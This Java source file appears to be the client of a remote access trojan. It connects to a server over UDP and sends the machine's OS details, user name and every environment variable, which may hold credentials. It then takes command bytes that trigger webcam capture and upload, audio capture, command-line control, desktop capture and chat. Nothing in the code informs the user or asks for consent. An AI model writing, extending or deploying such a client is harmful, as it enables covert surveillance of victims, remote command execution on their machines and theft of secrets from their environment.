package Client;

import Client.Features.*;
import Handler.InfoHandler;
import Handler.ObjectSerialization;
import Tools.Network.NetworkInterface;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.SocketException;
import java.time.LocalDateTime;
import java.util.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class Client extends NetworkInterface {

    public static void main(String[] args) throws SocketException {
        Client client = new Client(8000);
        Runtime.getRuntime().addShutdownHook(new Thread(client::disposeAll));
    }

    private static final ExecutorService threadListener = Executors.newSingleThreadScheduledExecutor();

    private static final Random rand = new Random(LocalDateTime.now().getSecond());
    private static final int id = rand.nextInt(1000000);

    private final InfoHandler infoHandler;

    private final CameraCapture cameraCapture = new CameraCapture(0);
    private final AudioCapture audioCapture = new AudioCapture();
    private final Chat chat = new Chat();
    private final CMDControl cmdControl = new CMDControl();
    private final DesktopCapture desktopCapture = new DesktopCapture();

    public Client(int PORT) throws SocketException {
        super(PORT);
        socket = new DatagramSocket();
        infoHandler = new InfoHandler(socket);
        threadListener.execute(listener());
    }

    private Runnable listener() {
        return () -> {
            try {
                packet = new DatagramPacket(new byte[]{CommandByte.START_BYTE, (byte) id}, 2);
                socket.connect(address, PORT);
                infoHandler.send(new byte[]{CommandByte.START_BYTE, (byte) id }, 2);
                socket.disconnect();
                byte[] dataReceived = infoHandler.receive(1, infoHandler.getAddress(), infoHandler.getPort());
                if (dataReceived[0] == CommandByte.CONFIRMATION_BYTE) {
                    System.out.println("Client connected to a server!");
                    threadListener.execute(infoListener());
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        };
    }

    private Runnable infoListener() {
        return () -> {
            ClientInfo<String[]> osInfoClient = () -> new String[]
                    {       String.valueOf(id),
                            System.getProperty("os.name"),
                            System.getProperty("os.version"),
                            System.getProperty("os.vendor"),
                            System.getProperty("os.arch"),
                            System.getProperty("user.name")
                    };
            ClientInfo<Map<String, String>> osInfoSystem = System::getenv;

            byte[] objInfo = Objects.requireNonNull(ObjectSerialization.serialize(osInfoClient.get()));
            byte[] objSystem = Objects.requireNonNull(ObjectSerialization.serialize(osInfoSystem.get()));

            try {
                socket.connect(address, PORT);
                infoHandler.send(objInfo, objInfo.length);

                infoHandler.send(objSystem, objSystem.length);
                socket.disconnect();

                if (infoHandler.receive(1, infoHandler.getAddress(), infoHandler.getPort())[0] == CommandByte.INFO_ACHIEVED_BYTE){
                    threadListener.execute(featureListener());
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        };
    }

    private Runnable featureListener() {
        return () -> {
            outer:
            while (true) {
                try {
                    byte[] data = infoHandler.receive(1, infoHandler.getAddress(), infoHandler.getPort());
                    switch (data[0]) {
                        case CommandByte.CAMERA_BYTE -> {
                            cameraCapture.startFeature();
                            byte[] imageData = cameraCapture.getImageAsByteArray();
                            infoHandler.send(imageData, imageData.length, infoHandler.getAddress(), infoHandler.getPort());
                        }
                        case CommandByte.AUDIOCAPTURE_BYTE -> audioCapture.startFeature();
                        case CommandByte.CMDCONTROL_BYTE -> cmdControl.startFeature();
                        case CommandByte.DESKTOPCONTROL_BYTE -> desktopCapture.startFeature();
                        case CommandByte.CHAT_BYTE -> chat.startFeature();
                        case CommandByte.STOP_BYTE -> { break outer; }
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
                sleep(1000 / 60);
            }
        };
    }

    @Override
    public void disposeAll() {
        threadListener.shutdown();
        super.disposeAll();
        socket.disconnect();
        socket.close();
    }
}

